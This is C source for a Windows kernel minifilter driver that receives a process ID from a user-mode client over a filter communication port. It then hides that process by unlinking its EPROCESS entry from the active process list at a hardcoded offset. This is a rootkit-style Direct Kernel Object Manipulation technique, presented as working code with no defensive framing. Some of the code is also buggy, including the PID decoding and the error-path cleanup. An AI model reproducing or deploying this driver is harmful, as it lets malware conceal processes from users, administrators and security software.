#include "MFLTData.h"

#define DbgPrint(x, ...) DbgPrint("[DKOM] " x, __VA_ARGS__)
#define MFLT_COM_PORT_NAME L"\\DKOMCOM"

#if NTDDI_VERSION < NTDDI_WIN10
#define ExAllocatePool2 ExAllocatePoolWithTag
#undef POOL_FLAG_NON_PAGED
#define POOL_FLAG_NON_PAGED NonPagedPool
#endif

MFLT_DATA mfltData;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
NTSTATUS DriverExit(FLT_FILTER_UNLOAD_FLAGS fltUnloadFlags);
NTSTATUS DriverQueryTeardown(PCFLT_RELATED_OBJECTS pFltObjects,
                             FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags);
NTSTATUS COMPortConnect(PFLT_PORT pClientPort, PVOID pServerPortCookie,
                        PVOID pConnectionContext, ULONG ulSizeOfContext,
                        PVOID* pConnectionCookie);
NTSTATUS COMPortDisconnect(PVOID pConnectionCookie);
NTSTATUS COMPortMessageHandleRoutine(PFLT_GENERIC_WORKITEM pWorkItem,
                                     PVOID pFilterObject, PVOID pContext);

CONST FLT_REGISTRATION kFltRegistration = {sizeof(FLT_REGISTRATION),
                                           FLT_REGISTRATION_VERSION,
                                           FLTFL_REGISTRATION_SUPPORT_NPFS_MSFS,
                                           NULL,
                                           NULL,
                                           DriverExit,
                                           NULL,
                                           DriverQueryTeardown,
                                           NULL,
                                           NULL,
                                           NULL,
                                           NULL,
                                           NULL,
                                           NULL,
                                           NULL};

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject,
                     PUNICODE_STRING pulRegistryPath) {
  UNREFERENCED_PARAMETER(pulRegistryPath);

  DbgPrint("DriverEntry called\n");

  NTSTATUS ntStatus = STATUS_SUCCESS;
  ntStatus =
      FltRegisterFilter(pDriverObject, &kFltRegistration, &mfltData.pFilter);
  if (!NT_SUCCESS(ntStatus)) {
    DbgPrint("FltRegisterFilter failed: 0x%08X\n", ntStatus);
    return ntStatus;
  }

  PSECURITY_DESCRIPTOR psd;
  ntStatus = FltBuildDefaultSecurityDescriptor(&psd, FLT_PORT_ALL_ACCESS);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("Bulld security descriptor failed 0x%08x\n", ntStatus);
    FltUnregisterFilter(mfltData.pFilter);
    return ntStatus;
  }

  UNICODE_STRING usMfltPortName;
  RtlInitUnicodeString(&usMfltPortName, MFLT_COM_PORT_NAME);

  OBJECT_ATTRIBUTES oa;
  InitializeObjectAttributes(&oa, &usMfltPortName,
                             OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL,
                             psd);
  ntStatus = FltCreateCommunicationPort(mfltData.pFilter, &mfltData.pServerPort,
                                        &oa, NULL, COMPortConnect,
                                        COMPortDisconnect, NULL, 1);
  FltFreeSecurityDescriptor(psd);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("Create COM port failed 0x%08x\n", ntStatus);
    FltUnregisterFilter(mfltData.pFilter);
    return ntStatus;
  }

  ntStatus = FltStartFiltering(mfltData.pFilter);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("Start filtering failed 0x%08x\n", ntStatus);
    FltCloseCommunicationPort(mfltData.pServerPort);
    FltUnregisterFilter(mfltData.pFilter);
    return ntStatus;
  }
  DbgPrint("Start filtering successful\n");

  return ntStatus;
}

NTSTATUS DriverExit(FLT_FILTER_UNLOAD_FLAGS fltUnloadFlags) {
  UNREFERENCED_PARAMETER(fltUnloadFlags);

  DbgPrint("DriverExit called\n");

  mfltData.bIsComPortClosed = TRUE;
  FltCloseCommunicationPort(mfltData.pServerPort);

  FltUnregisterFilter(mfltData.pFilter);

  return STATUS_SUCCESS;
}

NTSTATUS DriverQueryTeardown(PCFLT_RELATED_OBJECTS pFltObjects,
                             FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags) {
  UNREFERENCED_PARAMETER(pFltObjects);
  UNREFERENCED_PARAMETER(Flags);

  return STATUS_SUCCESS;
}

NTSTATUS COMPortConnect(PFLT_PORT pClientPort, PVOID pServerPortCookie,
                        PVOID pConnectionContext, ULONG ulSizeOfContext,
                        PVOID* pConnectionCookie) {
  UNREFERENCED_PARAMETER(pServerPortCookie);
  UNREFERENCED_PARAMETER(pConnectionContext);
  UNREFERENCED_PARAMETER(ulSizeOfContext);
  UNREFERENCED_PARAMETER(pConnectionCookie);

  NTSTATUS ntStatus = STATUS_SUCCESS;

  DbgPrint("mfltComConnect called\n");
  FLT_ASSERT(mfltData.pClientPort == NULL);
  mfltData.pClientPort = pClientPort;

  mfltData.bIsComPortClosed = FALSE;

  PFLT_GENERIC_WORKITEM pWorkItem = FltAllocateGenericWorkItem();
  if (pWorkItem == NULL) {
    DbgPrint("Allocate work item failed\n");
    return STATUS_INSUFFICIENT_RESOURCES;
  }
  ntStatus = FltQueueGenericWorkItem(pWorkItem, mfltData.pFilter,
                                     COMPortMessageHandleRoutine,
                                     DelayedWorkQueue, NULL);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("Queue work item failed 0x%08x\n", ntStatus);
    return ntStatus;
  }

  return ntStatus;
}

NTSTATUS COMPortDisconnect(PVOID pConnectionCookie) {
  UNREFERENCED_PARAMETER(pConnectionCookie);

  DbgPrint("mfltComDisconnect called\n");
  mfltData.bIsComPortClosed = TRUE;
  FltCloseClientPort(mfltData.pFilter, &mfltData.pClientPort);
  return STATUS_SUCCESS;
}

NTSTATUS COMPortMessageHandleRoutine(PFLT_GENERIC_WORKITEM pWorkItem,
                                     PVOID pFilterObject, PVOID pContext) {
  UNREFERENCED_PARAMETER(pFilterObject);
  UNREFERENCED_PARAMETER(pContext);

  // MFLT_SEND_MESSAGE sendMsg;
  NTSTATUS ntStatus;
  // LARGE_INTEGER liTimeOut = {0};

  ULONG ulPIDBufferSize = 64;

  PCHAR pcSendBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, 3, 'dnes');

  if (pcSendBuffer == NULL) {
    DbgPrint("Allocate send buffer failed\n");
    FltFreeGenericWorkItem(pWorkItem);
    return STATUS_INSUFFICIENT_RESOURCES;
  }
  pcSendBuffer[0] = 'o';
  pcSendBuffer[1] = 'k';
  pcSendBuffer[2] = 0;
  PUCHAR pbPIDBuffer =
      ExAllocatePool2(POOL_FLAG_NON_PAGED,
                      sizeof(FILTER_REPLY_HEADER) + ulPIDBufferSize, 'dipd');
  if (pbPIDBuffer == NULL) {
    DbgPrint("Allocate PID buffer failed\n");
    ExFreePool(pcSendBuffer);
    FltFreeGenericWorkItem(pWorkItem);
    return STATUS_INSUFFICIENT_RESOURCES;
  }
  ULONG ulPIDBufferLength = sizeof(FILTER_REPLY_HEADER) + ulPIDBufferSize;
  ULONG ulPID = 0;

  // liTimeOut.QuadPart = 1000;

  // Send "ok", expect 64 bits of PID
  if (mfltData.pClientPort != NULL) {
    if (!mfltData.bIsComPortClosed) {
      ntStatus =
          FltSendMessage(mfltData.pFilter, &mfltData.pClientPort, pcSendBuffer,
                         3, pbPIDBuffer, &ulPIDBufferLength, NULL);
      if (ntStatus != STATUS_SUCCESS) {
        DbgPrint("FltSendMessage failed 0x%08x\n", ntStatus);
      }
    }
  } else {
    DbgPrint("Client port not detected\n");
  }

  for (ULONG i = 0; i < ulPIDBufferSize; ++i) {
    ulPID |= (pbPIDBuffer[i] - '0') << i;
  }

  DbgPrint("Received Process ID: %d\n", ulPID);

  // Open process from PID
  HANDLE hProc;
  OBJECT_ATTRIBUTES oa;
  PSECURITY_DESCRIPTOR psd;
  CLIENT_ID cid = {(HANDLE)ulPID, NULL};

  ntStatus = FltBuildDefaultSecurityDescriptor(&psd, FLT_PORT_ALL_ACCESS);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("Bulld security descriptor failed 0x%08x\n", ntStatus);
    return ntStatus;
  }
  InitializeObjectAttributes(
      &oa, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, psd);
  ntStatus = ZwOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("ZwOpenProcess failed 0x%08x\n", ntStatus);
    return ntStatus;
  }

  // Get EPROCESS from handle
  PEPROCESS peprocess;
  ntStatus = ObReferenceObjectByHandle(
      hProc, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &peprocess, NULL);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("ObReferenceObjectByHandle failed 0x%08x\n", ntStatus);
    return ntStatus;
  }

  // DKOM: jump to the list entries and set the back and forward links
  PLIST_ENTRY pleActiveProcessLink =
      ((PLIST_ENTRY)((ULONGLONG)peprocess + 0x0448));
  pleActiveProcessLink->Flink->Blink = pleActiveProcessLink->Blink;
  pleActiveProcessLink->Blink->Flink = pleActiveProcessLink->Flink;

  // Close handle
  ntStatus = NtClose(hProc);
  if (ntStatus != STATUS_SUCCESS) {
    DbgPrint("NtClose failed 0x%08x\n", ntStatus);
    return ntStatus;
  }
  //ObDereferenceObject(peprocess);

  // Send "ok"
  if (mfltData.pClientPort != NULL) {
    if (!mfltData.bIsComPortClosed) {
      ntStatus = FltSendMessage(mfltData.pFilter, &mfltData.pClientPort,
                                pcSendBuffer, 3, NULL, 0, NULL);
      if (ntStatus != STATUS_SUCCESS) {
        DbgPrint("FltSendMessage failed 0x%08x\n", ntStatus);
      }
    }
  } else {
    DbgPrint("Client port not detected\n");
  }

  ExFreePool(pcSendBuffer);
  ExFreePool(pbPIDBuffer);

  FltFreeGenericWorkItem(pWorkItem);

  return STATUS_SUCCESS;
}